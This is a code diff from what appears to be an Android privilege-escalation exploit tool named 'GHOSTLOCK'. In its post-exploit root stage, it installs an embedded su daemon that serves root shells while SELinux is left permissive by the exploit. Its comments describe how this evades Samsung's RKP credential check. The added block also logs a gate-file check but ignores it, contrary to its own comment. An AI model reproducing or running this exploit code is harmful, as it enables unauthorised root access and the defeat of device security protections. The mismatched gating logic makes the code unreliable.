@@ -7,6 +7,8 @@
 #define LOG_TAG "GHOSTLOCK"
 #define KSU_LOADER_PATH "/data/local/tmp/ksud"
 #define LOGCAT_PATH "/system/bin/logcat"
+/* Ported temp_su.sock ephemeral-root installer (src/tempsu.c). */
+extern int install_embedded_su(pid_t *daemon_pid);
 /* Exec'ing a bind-mounted helper via logcat transitions the child into
  * logcat's restricted SELinux domain (observed: helper could read
  * /data/local/tmp but every write — markers, stdio file, .ksud-stage —
@@ -83,6 +85,23 @@ int koload_with_kallsyms(const char *path, const char *params);
 int do_root_stage() {
   android_log("[*] Am I root? uid=%d\n", getuid());
   ghost_mark("root: entered, uid=%d", getuid());
+
+  /* Ephemeral temp_su.sock root: with /data/local/tmp/ghostlock-tempsu set,
+   * install the embedded su daemon NOW, while SELinux is still permissive from
+   * the exploit and before load_policy re-arms vendor_modprobe restrictions.
+   * The daemon serves root shells by fork+exec inheritance, so it never
+   * triggers the Samsung RKP app->root cred check. Return before the KSU
+   * handoff so RKP is never exercised — re-run the exploit after each reboot. */
+  {
+    int gate = access("/data/local/tmp/ghostlock-tempsu", F_OK);
+    ghost_mark("root: tempsu gate access=%d errno=%d uid=%d", gate, errno,
+        getuid());
+    pid_t sud = -1;
+    ghost_mark("root: tempsu install starting");
+    int rc = install_embedded_su(&sud);
+    ghost_mark("root: tempsu install rc=%d daemon_pid=%d", rc, (int)sud);
+    return rc ? 0 : 1;
+  }
 
   /* Panic post-mortem: on this PANIC_ON_OOPS device the previous boot's
    * dying words live in pstore. The shell is SELinux-denied, but the root
